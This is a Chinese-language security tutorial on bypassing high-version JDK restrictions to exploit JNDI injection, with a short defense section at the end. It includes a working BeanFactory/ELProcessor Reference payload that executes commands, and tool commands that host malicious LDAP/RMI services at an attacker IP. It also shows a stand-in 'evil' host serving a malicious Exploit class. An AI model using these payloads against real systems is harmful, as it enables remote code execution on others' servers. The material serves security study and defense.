# 绕过过高版本Jdk的限制进行Jndi注入利用

## 一句话理解
高版本 JDK 对经典 JNDI 注入链做了多轮收紧，但这并不等于 JNDI 完全不可利用。核心变化是“远程类加载”越来越难，而利用思路逐渐转向“本地类利用”“本地工厂利用”和“反序列化链利用”。

## 为什么高版本变难了
### 1. `trustURLCodebase = false`
历史上，攻击者常通过 RMI / LDAP 返回恶意 `Reference`，诱导目标从远程加载恶意类。

后来高版本 JDK 开始限制这类行为：
- RMI 从 `JDK 6u132`、`7u122`、`8u113` 起收紧
- LDAP 从 `JDK 11.0.1`、`8u191`、`7u201`、`6u211` 起收紧

也就是远程 `ObjectFactory` 加载不再默认允许。

### 2. JEP 290 反序列化过滤
JEP 290 引入了输入过滤机制，用来限制反序列化类、深度和复杂度。

适用范围：
- JDK 9 正式引入
- JDK 8u121、7u131、6u141 等高版本也补入了类似能力

规范原文：
- [JEP 290: Filter Incoming Serialization Data](https://openjdk.org/jeps/290)

核心能力：
- 限制允许反序列化的类
- 限制对象深度和复杂度
- 为 RMI 调用提供类过滤机制
- 支持通过配置定义过滤策略

## 高版本下的利用思路
经典“远程类加载”受限后，常见思路转为：
- 利用受害者本地 CLASSPATH 中已有类
- 利用本地工厂类触发方法调用
- 通过 LDAP 返回序列化对象，走反序列化 Gadget 链

## 常见利用方向
### 1. 本地 `Reference Factory` 利用
思路是：
- 不再依赖远程恶意类
- 改为找目标本地已有的可利用工厂类
- 让 JNDI 返回的 `Reference` 调用这些本地类完成危险行为

公开高频思路是利用 Tomcat 的：
- `org.apache.naming.factory.BeanFactory`

再进一步调用：
- `javax.el.ELProcessor#eval`
- `groovy.lang.GroovyShell#evaluate`

### 2. LDAP 返回序列化对象
另一条常见思路是：
- LDAP 不返回远程类加载对象
- 而是直接返回恶意序列化数据
- 目标在处理 `javaSerializedData` 时触发本地 Gadget 链

也就是把 JNDI 注入与 Java 反序列化利用结合起来。

### 3. BeanFactory + EL 完整构造

对上文「本地 `Reference Factory` 利用」的展开。利用 Tomcat 自带的 `org.apache.naming.factory.BeanFactory` 处理 `Reference`，把“属性赋值”变成“任意单参方法调用”（`ELProcessor.eval`），全程不触发远程类加载，不受 `trustURLCodebase` 限制。

恶意 LDAP / RMI 服务端返回的 `Reference` 构造要点：

```java
// 目标类指定为 ELProcessor（Tomcat 自带 javax.el 包），工厂类指定为 Tomcat 的 BeanFactory
Reference ref = new Reference("javax.el.ELProcessor", "org.apache.naming.factory.BeanFactory", null);

// 关键一步：forceString 把属性 x 的赋值改写为对 eval 方法的调用
// 正常流程 BeanFactory 会对属性 x 调用 setX(String)；配置 x=eval 后变为 ELProcessor.eval(属性值)
ref.add(new StringRefAddr("forceString", "x=eval"));

// 属性 x 的值即待执行的 EL 表达式，BeanFactory 处理时作为 eval 的参数传入
ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec('id')"));
```

逐行说明：
1. `new Reference("javax.el.ELProcessor", "org.apache.naming.factory.BeanFactory", null)`：JNDI 客户端 `lookup()` 拿到 Reference 后交给 BeanFactory 处理，BeanFactory 反射实例化 ELProcessor，并把 Reference 中每个 `StringRefAddr` 当作一条属性赋值
2. `forceString = "x=eval"`：BeanFactory 的隐藏特性——被 forceString 标记的属性不走 `setX()`，而是直接调用同名方法 `eval(String)`，等于把“setter 注入”升级为“任意单参数方法调用”
3. `x = "Runtime..."`：作为 `eval()` 的参数，由 EL 引擎解析执行，效果等同代码执行

前提：目标类路径存在 Tomcat（catalina.jar）与 EL 实现（el-api / jasper-el），Tomcat 部署的 Java Web 应用默认满足。

Groovy 版替换思路：目标类换成 `groovy.lang.GroovyShell`，forceString 指向 `evaluate`，属性值传 Groovy 脚本，要求目标带 Groovy 依赖。

落地方式：把上述 Reference 作为恶意 LDAP / RMI 服务中 `lookup` 的返回对象即可，JNDIExploit（JNDI-Injection-Exploit-Plus）等工具已内置该路径。

## 常用工具

### 1. JNDI-Injection-Exploit

一键搭建恶意 RMI / LDAP 服务并自动输出多种 payload 格式，适合快速利用 JNDI 注入点。

```bash
# -C 指定目标要执行的命令，-A 指定攻击机 IP
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "whoami" -A 10.10.10.10
```

工具会同时监听多个 RMI / LDAP 端口并打印可用 payload，例如：

```text
RMI:  rmi://10.10.10.10:1099/ExportObject
LDAP: ldap://10.10.10.10:1389/ExportObject
```

把对应 URL 填入注入点（如 Fastjson 的 `dataSourceName`、log4j2 的 `${jndi:...}`）即可。目标 JDK 版本较高时，优先选择工具输出的“本地工厂”类 payload。

### 2. marshalsec

marshalsec 的 JNDI 模块可快速搭建返回恶意 Reference 的 LDAP / RMI 服务，常与 HTTP 服务配合完成远程类加载。

```bash
# 启动恶意 LDAP Reference 服务：指向攻击机 HTTP 目录，监听 1389 端口
# "#" 后的 Exploit 是类名，目标 JVM 会去请求 http://evil:8080/Exploit.class
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://evil:8080/#Exploit" 1389
```

配套恶意类 Exploit.java（放在 HTTP 服务根目录）：

```java
// 恶意类：目标 JVM 加载该类时，静态代码块立即执行
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

编译与托管：

```bash
# 指定低字节码版本编译，避免目标 JVM 报 UnsupportedClassVersionError
javac -source 1.8 -target 1.8 Exploit.java
# 在 Exploit.class 所在目录快速起 HTTP 服务
python -m http.server 8080
```

注意：`LDAPRefServer` 走远程类加载路径，只适用于 JDK 8u191 之前的低版本目标；高版本需转向本地 Factory（见上文 BeanFactory + EL）。

## 与普通 JNDI 注入的区别
高版本场景下，重点不再是“起一个恶意类服务器就能打”，而是：
- 目标本地有哪些类
- 应用是否带 Tomcat、Groovy、EL 等组件
- 是否存在可用 Gadget
- JEP 290 是否放行相关类

## 高版本绕过全景表

| 目标 JDK | 远程类加载 | 可用绕过路径 | 说明 |
|---|---|---|---|
| < 8u113（RMI）/ < 8u191（LDAP） | 可用 | RMI / LDAP Reference 远程加载 | 经典打法：marshalsec + HTTP 服务托管恶意类 |
| 8u113+ / 8u191+ | 不可用（trustURLCodebase=false） | LDAP 本地 Factory：BeanFactory + EL | 要求目标为 Tomcat 部署（自带 BeanFactory 与 EL） |
| 8u191+ | 不可用 | LDAP 返回 javaSerializedData + 本地 Gadget | 结合 CC / CB 等反序列化链，要求目标有对应依赖 |
| < 8u251 | 不可用 | BCEL 类加载 | 用 JDK 自带 `com.sun.org.apache.bcel.internal` 的 ClassLoader 加载编码进类名的恶意类，8u251 起 BCEL 被移除 |
| 不限（带 Groovy） | 不可用 | GroovyShell#evaluate 本地 Factory | 与 BeanFactory + EL 同思路，要求目标有 Groovy 依赖 |
| JDK 17+ | 不可用 | 依赖组件自身 Gadget | 强封装（JEP 396 / 403）阻断对 JDK 内部类反射，经典链大量失效，JEP 290 过滤也更严格 |

补充：RMI 自 8u121 起还受 JEP 290 内置过滤器约束，即使远程加载未被封，也可能被过滤器拦截。

## 实战排查思路
### 1. 先看 JDK 版本
这是判断是否还能走经典链的第一步。

### 2. 再看目标类路径
重点确认是否存在：
- Tomcat 相关类
- EL 相关类
- Groovy
- 常见反序列化 Gadget 依赖

### 3. 再看协议与返回对象类型
区分：
- RMI 路径
- LDAP 路径
- `Reference` 利用
- `javaSerializedData` 利用

### 4. 再看 JEP 290 过滤
即使有 Gadget，也可能被过滤器挡掉。

## 防御要点
### 1. 升级 JDK 不是终点
高版本只是缩小经典利用面，不代表所有 JNDI 风险都消失。

### 2. 禁止不可信 JNDI 输入
不要把用户输入直接交给 `lookup()`。

### 3. 限制可访问协议与命名源
明确限制 LDAP、RMI 等外部命名服务的访问。

### 4. 使用反序列化过滤
结合 JEP 290 或应用层白名单进一步减少可利用面。

### 5. 最小化依赖
目标类路径里的 Tomcat、Groovy、EL、Commons 类越少，可利用面越小。

## 速查清单
- 先确认 JDK 版本和 `trustURLCodebase` 限制范围
- 再确认目标本地是否存在 BeanFactory、EL、Groovy 等可利用类
- 再判断是 `Reference` 利用还是 `javaSerializedData` 反序列化利用
- 检查是否启用了 JEP 290 以及过滤策略
- 不把“高版本 JDK”误判为“天然安全”

## Reference
- [探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)
- [JNDI-Injection-Exploit - GitHub](https://github.com/welk1n/JNDI-Injection-Exploit)
- [marshalsec - GitHub](https://github.com/mbechler/marshalsec)
- [JNDI：JNDI-LDAP 注入及高版本JDK限制](https://m0d9.me/2020/07/23/JNDI-LDAP%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%E2%80%94%E2%80%94%E4%B8%8A/)
- [如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)
- [jdk21下的 jndi 注入](https://xz.aliyun.com/t/15265?time__1311=GqjxnD0D2AGQqGNeWxUxQTTxfx%3D3%3DkeW4D)
- [漫谈 JEP 290](https://xz.aliyun.com/t/10170)
